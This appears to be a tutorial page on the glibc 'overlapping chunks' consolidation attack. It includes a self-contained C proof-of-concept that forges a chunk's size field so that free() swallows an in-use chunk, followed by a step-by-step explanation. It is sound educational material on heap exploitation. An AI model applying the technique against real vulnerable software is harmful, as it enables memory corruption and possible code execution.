#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Overlapping Chunks (Consolidation)",
    description: "A variation of the overlapping chunks attack that leverages forward consolidation to swallow a non-adjacent chunk.",
    date: "2025-12-26",
    order: 29,
  ),
)<frontmatter>

= glibc Allocator: Overlapping Chunks 2

== Introduction

This variation of the "Overlapping Chunks" technique, often referred to as the *Nonadjacent Free Chunk Consolidation Attack*, achieves memory overlap by abusing the allocator's consolidation logic. Instead of just making a chunk appear larger for a future `malloc`, we overwrite the size of an in-use chunk so that when it is `free()`-d, the allocator consolidates it with a non-adjacent free chunk, "swallowing" the allocated chunk that sits between them.

The result is a single large free chunk in the Unsorted Bin that encompasses multiple original chunks, some of which may still be considered "in use" by the application.

== Prerequisites
- *Heap Overflow*: Ability to overwrite the `size` field of an allocated chunk (the one being freed).
- *Heap Layout*: The new size must extend exactly to the beginning of another free chunk (to trigger forward consolidation).
- *Free Primitive*: Ability to free the overwritten chunk.

== Example from `overlapping_chunks_2.c`

This PoC demonstrates how to swallow an allocated chunk (`p3`) by consolidating `p2` and `p4`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main(){

  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use = 0x1;

  fprintf(stderr, "\nThis is a simple chunks overlapping problem");
  fprintf(stderr, "\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n");
  fprintf(stderr, "\nLet's start to allocate 5 chunks on the heap:");

  p1 = malloc(1000);
  p2 = malloc(1000);
  p3 = malloc(1000);
  p4 = malloc(1000);
  p5 = malloc(1000);

  real_size_p1 = malloc_usable_size(p1);
  real_size_p2 = malloc_usable_size(p2);
  real_size_p3 = malloc_usable_size(p3);
  real_size_p4 = malloc_usable_size(p4);
  real_size_p5 = malloc_usable_size(p5);

  fprintf(stderr, "\n\nchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
  fprintf(stderr, "\nchunk p2 from %p to %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
  fprintf(stderr, "\nchunk p3 from %p to %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
  fprintf(stderr, "\nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
  fprintf(stderr, "\nchunk p5 from %p to %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));

  memset(p1,'A',real_size_p1);
  memset(p2,'B',real_size_p2);
  memset(p3,'C',real_size_p3);
  memset(p4,'D',real_size_p4);
  memset(p5,'E',real_size_p5);

  fprintf(stderr, "\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n");

  free(p4);

  fprintf(stderr, "\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n");

  /* VULNERABILITY: Overwrite the size field of chunk p2 */
  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2;

  fprintf(stderr, "\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n");
  fprintf(stderr, "\nThis operation will basically create a big free chunk that wrongly includes p3\n");
  free(p2);

  fprintf(stderr, "\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n");

  p6 = malloc(2000);
  real_size_p6 = malloc_usable_size(p6);

  fprintf(stderr, "\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n");
  fprintf(stderr, "\nchunk p6 from %p to %p", p6,  (unsigned char *)p6+real_size_p6);
  fprintf(stderr, "\nchunk p3 from %p to %p\n", p3, (unsigned char *) p3+real_size_p3);

  fprintf(stderr, "\nData inside chunk p3: \n\n");
  fprintf(stderr, "%s\n",(char *)p3);

  fprintf(stderr, "\nLet's write something inside p6\n");
  memset(p6,'F',1500);

  fprintf(stderr, "\nData inside chunk p3: \n\n");
  fprintf(stderr, "%s\n",(char *)p3);
}
```

== Attack Flow Explained

=== 1. Setup

We allocate five chunks: `p1`, `p2`, `p3`, `p4`, and `p5`. All are 1000 bytes, ensuring they are handled by the Unsorted/Small bins rather than fastbins or tcache. `p5` acts as a barrier to prevent `p4` from consolidating with the top chunk.

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Chunk*], [*Status*], [*Note*],
    [`p1`], [Allocated], [Vulnerability source],
    [`p2`], [Allocated], [Target for size overwrite],
    [`p3`], [Allocated], [*Target to be swallowed*],
    [`p4`], [Allocated], [Target for consolidation],
    [`p5`], [Allocated], [Top chunk barrier],
  ),
  caption: [Initial heap layout.],
)

=== 2. Preparing the Consolidation Target

We `free(p4)`. It is placed in the Unsorted Bin.

=== 3. The Vulnerability: Forward Size Overwrite

Using a buffer overflow in `p1`, we overwrite the `size` field of `p2`. We set it to `size(p2) + size(p3)`.

Crucially, the allocator determines the "next" chunk of `p` by calculating `p + size(p)`. By increasing `p2`'s size, we make the allocator believe that the chunk immediately following `p2` is actually `p4`.

=== 4. Triggering the Consolidation

We call `free(p2)`. The allocator performs the following logic:
1. Look at `p2`'s size.
2. Calculate the next chunk: `next = p2 + new_size_p2` (which is `p4`).
3. Check if `next` is free. It looks at the metadata of `p4` (or rather, the chunk after it) and sees that `p4` is indeed free.
4. Consolidate `p2` with `next` (`p4`).

The result is a single massive free chunk in the Unsorted Bin starting at `p2` and ending at the end of `p4`, completely skipping over the metadata and data of `p3`.

=== 5. Re-allocation and Overlap

We request a new allocation `p6 = malloc(2000)`. This request is satisfied by the large free chunk we just created.

#figure(
  table(
    columns: (auto, auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Variable*], [*Address*], [*Size*], [*Note*],
    [`p3`], `BASE + 0x...`, `1000`, [Still "allocated" from the application's perspective],
    [`p6`], `BASE + 0x...`, `2000`, [Returned by `malloc`, overlaps `p3`!],
  ),
  caption: [Final state: `p6` and `p3` share the same memory region.],
)

Writing to `p6` now allows us to corrupt the data inside `p3` without the application noticing a change in `p3`'s pointer.

